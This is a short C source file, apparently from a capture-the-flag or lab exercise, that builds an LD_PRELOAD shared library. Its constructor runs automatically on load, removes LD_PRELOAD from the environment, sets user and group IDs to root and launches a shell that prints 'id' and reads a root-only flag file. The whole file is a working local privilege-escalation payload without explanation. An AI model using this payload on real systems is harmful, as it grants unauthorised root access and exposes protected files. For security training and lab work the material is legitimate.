#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void hijack() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    execl("/bin/sh", "sh", "-c",
          "id; echo '--- FLAG ROOT ---'; cat /root/FLAG_LINUX_ROOT.txt 2>/dev/null",
          NULL);
}
